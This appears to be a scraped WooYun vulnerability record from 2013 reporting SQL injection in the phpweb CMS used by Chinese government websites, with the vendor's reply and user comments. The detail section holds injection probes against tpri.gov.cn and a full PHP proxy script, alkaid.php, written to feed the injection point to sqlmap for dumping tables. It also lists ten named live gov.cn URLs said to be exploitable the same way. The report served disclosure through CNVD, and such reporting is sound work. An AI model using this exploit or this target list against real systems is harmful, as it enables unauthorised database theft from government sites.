{"id": 59763, "wybug_id": "wooyun-2013-046157", "wybug_title": "phpweb建站程序可导致大量政府网站受到安全影响", "wybug_corp": "CNVD", "wybug_author": "lxj616", "wybug_date": "2013-12-17 11:32", "wybug_open_date": "2014-03-17 11:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-17：\t细节向公众公开  简要描述： phpweb建站程序可导致大量政府网站受到安全影响（举10例，实际远远不止这么多，注射跑表只演示1例，其他的同理） 详细说明：  下面以tpri.gov.cn为例进行分析（包括跑表）漏洞入口：\nhttp://www.tpri.gov.cn/news/html/?95.html\n\n\n尽管使用了伪静态，不过还是有注射……用最笨的方法\nhttp://www.tpri.gov.cn/news/html/?95'.html\n\n\n接下来就是分析构造了\nhttp://www.tpri.gov.cn/news/html/?95'/**/and/**/'1'='1.html\n\n\n那么，伪静态怎么跑表呢？我写了个POC，等一下解释原理alkaid.php\n<?phpfunction uc_fopen($url, $limit = 0, $post = '', $cookie = '', $bysocket = FALSE, $ip = '', $timeout = 15, $block = TRUE) {$return = '';$matches = parse_url($url);!isset($matches['host']) && $matches['host'] = '';!isset($matches['path']) && $matches['path'] = '';!isset($matches['query']) && $matches['query'] = '';!isset($matches['port']) && $matches['port'] = '';$host = $matches['host'];$path = $matches['path'] ? $matches['path'].($matches['query'] ? '?'.$matches['query'] : '') : '/';$port = !empty($matches['port']) ? $matches['port'] : 80;if($post) {   $out = \"POST $path HTTP/1.0\\r\\n\";   $out .= \"Accept: **\\r\\n\";   $out .= \"Accept-Language: zh-cn\\r\\n\";   $out .= \"User-Agent: $_SERVER[HTTP_USER_AGENT]\\r\\n\";   $out .= \"Host: $host\\r\\n\";   $out .= \"Connection: Close\\r\\n\";   $out .= \"Cookie: $cookie\\r\\n\\r\\n\";}else {   $out = \"GET $path HTTP/1.0\\r\\n\";   $out .= \"Accept: */*\\r\\n\";   //$out .= \"Referer: a',(select now()) and \".$inject.\")#\\r\\n\";   $out .= \"Accept-Language: zh-cn\\r\\n\";   $out .= \"User-Agent: $_SERVER[HTTP_USER_AGENT]\\r\\n\";   $out .= \"Host: $host\\r\\n\";   $out .= \"Connection: Close\\r\\n\";   $out .= \"Cookie: $cookie\\r\\n\\r\\n\";}$fp = @fsockopen(($ip ? $ip : $host), $port, $errno, $errstr, $timeout);if(!$fp) {   return '';//note $errstr : $errno \\r\\n} else {   stream_set_blocking($fp, $block);   stream_set_timeout($fp, $timeout);   @fwrite($fp, $out);   $status = stream_get_meta_data($fp);   if(!$status['timed_out']) {    while (!feof($fp)) {     if(($header = @fgets($fp)) && ($header == \"\\r\\n\" || $header == \"\\n\")) {      break;     }    }    $stop = false;    while(!feof($fp) && !$stop) {     $data = fread($fp, ($limit == 0 || $limit > 8192 ? 8192 : $limit));     $return .= $data;     if($limit) {      $limit -= strlen($data);      $stop = $limit <= 0;     }    }   }   @fclose($fp);   return $return;}}$value=uc_fopen('http://www.tpri.gov.cn/news/html/?'.$_GET[\"a\"].'.html',0,0,0,FALSE,'',15,true);echo $value;?>\n实际上是一个包转发，把$_GET['a']的值后面加上“.html”然后发到注射点，大牛们也可以试着手注……倒数第二行是漏洞地址，根据需要把'http://www.tpri.gov.cn/news/html/?'换成其他漏洞地址即可，默认的这是我演示跑表的那个用法：alkaid.php?a=57 放到sqlmap里跑就好了（注意，这个57是有效的页面号码）\n\n\n\n居然有 cms_ 的前缀！我才意识到这是个CMS稍微google一下，发现超多政府网站在用这一款CMS举10例，直接用上文方法通杀\nhttp://www.tpri.gov.cn/news/html/?57.htmlhttp://tsmzx.jcxedu.gov.cn/news/html/?57.htmlhttp://rcjt.gov.cn/news/html/?57.htmlhttp://site.jledu.gov.cn/ljslx/news/html/?57.htmlhttp://www.wnyz.gov.cn/news/html/?57.htmlhttp://www.wnhth.gov.cn/news/html/?57.htmlhttp://fjz.bjxczx.gov.cn/news/html/?57.htmlhttp://ghz.gov.cn/news/html/?57.htmlhttp://tiepu.gov.cn/news/html/?56.htmlhttp://www.cfdqx.gov.cn/news/html/?56.html\n   漏洞证明：  求CNVD证书\n\n\n\n举10例，直接用上文方法通杀，伪静态实在是不可靠哈\nhttp://www.tpri.gov.cn/news/html/?57.htmlhttp://tsmzx.jcxedu.gov.cn/news/html/?57.htmlhttp://rcjt.gov.cn/news/html/?57.htmlhttp://site.jledu.gov.cn/ljslx/news/html/?57.htmlhttp://www.wnyz.gov.cn/news/html/?57.htmlhttp://www.wnhth.gov.cn/news/html/?57.htmlhttp://fjz.bjxczx.gov.cn/news/html/?57.htmlhttp://ghz.gov.cn/news/html/?57.htmlhttp://tiepu.gov.cn/news/html/?56.htmlhttp://www.cfdqx.gov.cn/news/html/?56.html\n   修复方案：  天哪，这么多gov.cn，这可怎么办呐！！！   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-12-21 23:06 厂商回复： CNVD后续未在实例上直接复现，已经向白帽子请教，对于机理分析后确认为通用软件漏洞。rank 20 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-15 23:25 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  23333这个...    \n     2014-11-01 17:27 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  能写poc的都是大牛--- 求收徒    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}